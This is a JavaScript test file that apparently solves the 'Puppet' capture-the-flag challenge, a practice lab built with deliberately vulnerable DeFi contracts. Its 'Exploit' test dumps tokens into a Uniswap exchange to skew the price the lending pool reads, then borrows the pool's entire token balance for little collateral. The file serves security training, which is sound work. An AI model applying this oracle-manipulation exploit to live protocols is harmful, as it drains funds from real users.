...
describe("[Challenge] Puppet", function () {
    ...
    it("Exploit", async function () {
        ...
        // 1) Approve Uniswap to transfer DVT
        console.log(`Exchange Address=${this.uniswapExchange.address}`)
        const tokenConnect = this.token.connect(attacker)
        await tokenConnect.approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE)
        // 2) Exchange DVT for ETH so that Uniswap has less ETH => ETH price would go up
        const exchangeConnect = this.uniswapExchange.connect(attacker)
        await exchangeConnect.tokenToEthSwapOutput(
            ethers.utils.parseEther("9.9"), // Exact ETH Amount
            ethers.utils.parseEther("1000"), // Max Token
            Date.now() + 60
        )

        const exchangeBalanceETH = await ethers.provider.getBalance(this.uniswapExchange.address)
        const exchangeBalanceToken = await this.token.balanceOf(this.uniswapExchange.address)
        const tokenPrice = exchangeBalanceETH
            .mul(ethers.utils.parseEther("1"))
            .div(exchangeBalanceToken)
        const ethNeededToBorrow = tokenPrice
            .mul(POOL_INITIAL_TOKEN_BALANCE)
            .mul(2)
            .div(ethers.utils.parseEther("1"))
        console.log(`exchangeBalanceETH = ${ethers.utils.formatEther(exchangeBalanceETH)}`)
        console.log(`exchangeBalanceToken = ${ethers.utils.formatEther(exchangeBalanceToken)}`)
        console.log(`Token price in ETH from Oracle: ${ethers.utils.formatEther(tokenPrice)}`)
        console.log(
            `ETH needed for ${ethers.utils.formatEther(
                POOL_INITIAL_TOKEN_BALANCE
            )} DVT= ${ethers.utils.formatEther(ethNeededToBorrow)} ETH`
        )
        // 3) Borrower all DVT in the pool
        const poolConnect = this.lendingPool.connect(attacker)
        await poolConnect.borrow(POOL_INITIAL_TOKEN_BALANCE, {
            value: ethNeededToBorrow,
        })
    })
